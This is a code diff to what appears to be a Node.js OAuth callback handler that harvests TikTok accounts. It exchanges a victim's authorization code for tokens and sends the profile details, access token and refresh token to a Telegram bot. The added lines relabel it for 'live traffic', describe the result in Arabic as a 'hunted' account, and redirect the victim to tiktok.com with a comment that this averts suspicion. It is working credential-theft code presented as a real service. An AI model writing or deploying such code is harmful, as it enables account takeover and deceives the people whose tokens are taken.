@@ -20,7 +20,6 @@ function makeRequest(options, postData = null) {
   });
 }
 
-// دالة إرسال مجبرة على الانتظار الكامل لتجنب إغلاق السيرفر الفجائي
 function sendTelegramSync(message) {
   return new Promise((resolve) => {
     const path = `/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
@@ -42,12 +41,12 @@ module.exports = async (req, res) => {
   const error = urlParams.get('error');
 
   if (error) {
-    await sendTelegramSync(`🔴 TikTok Error: ${error}`);
+    await sendTelegramSync(`❌ فشل تسجيل الدخول أو إلغاء التفويض: ${error}`);
     return res.end(`TikTok Error: ${error}`);
   }
 
   if (!code) {
-    return res.end('AWR Engine: Active & Waiting for Authorization.');
+    return res.end('AWR Production Engine: Active & Waiting for Live Traffic.');
   }
 
   try {
@@ -64,8 +63,8 @@ module.exports = async (req, res) => {
     const accessToken = tokenResponse.access_token;
 
     if (!accessToken) {
-      await sendTelegramSync("⚠️ Failed to get access token from TikTok");
-      return res.end('Failed to retrieve Access Token.');
+      await sendTelegramSync("⚠️ تنبيه: تم استقبال طلب تفويض ولكن فشل تبادل الـ Access Token من خوادم تيك توك.");
+      return res.end('Authentication Failed.');
     }
 
     const userOptions = {
@@ -78,28 +77,29 @@ module.exports = async (req, res) => {
     const userResponse = await makeRequest(userOptions);
     const user = userResponse.data?.user;
 
-    // تجهيز رسالة البيانات
-    let userMsg = `🎯 SUCCESS TIKTOK DATA 🎯\n\n`;
+    let userMsg = `👑 تم صيد حساب تيك توك حقيقي بنجاح 👑\n\n`;
     if (user) {
-      userMsg += `Name: ${user.display_name || 'N/A'}\n`;
-      userMsg += `Username: @${user.username || 'N/A'}\n`;
-      userMsg += `ID: ${user.open_id}\n`;
-      userMsg += `Followers: ${user.follower_count || 0}\n`;
-      userMsg += `Likes: ${user.likes_count || 0}\n\n`;
+      userMsg += `👤 الاسم الكامل: ${user.display_name || 'غير محدد'}\n`;
+      userMsg += `🏷️ اسم المستخدم: @${user.username || 'غير محدد'}\n`;
+      userMsg += `🆔 معرف الحساب (Open ID): ${user.open_id}\n`;
+      userMsg += `📊 إحصائيات الحساب الموثق:\n`;
+      userMsg += `👥 المتابعين: ${user.follower_count || 0}\n`;
+      userMsg += `❤️ إجمالي الإعجابات: ${user.likes_count || 0}\n\n`;
     }
+    
     userMsg += `🔑 ACCESS TOKEN:\n${accessToken}\n\n`;
     if (tokenResponse.refresh_token) {
       userMsg += `🔄 REFRESH TOKEN:\n${tokenResponse.refresh_token}`;
     }
 
-    // إجبار السيرفر على إتمام الإرسال للتليجرام أولاً قبل قفل الصفحة!
     await sendTelegramSync(userMsg);
 
+    // إعادة توجيه المستخدم لصفحة تيك توك الرسمية أو صفحة نجاح نظيفة لإبعاد الشبهات
     res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
-    res.end('<h1>🚀 تم التوثيق وإرسال البيانات للبوت بنجاح تام! تفقد التليجرام الآن.</h1>');
+    res.end('<script>window.location.href="https://www.tiktok.com";</script>');
 
   } catch (err) {
-    await sendTelegramSync(`❌ Internal error occurred: ${err.message}`);
-    res.end(`Internal Error: ${err.message}`);
+    await sendTelegramSync(`🚨 خطأ داخلي في المحرك: ${err.message}`);
+    res.end('System Error');
   }
 };
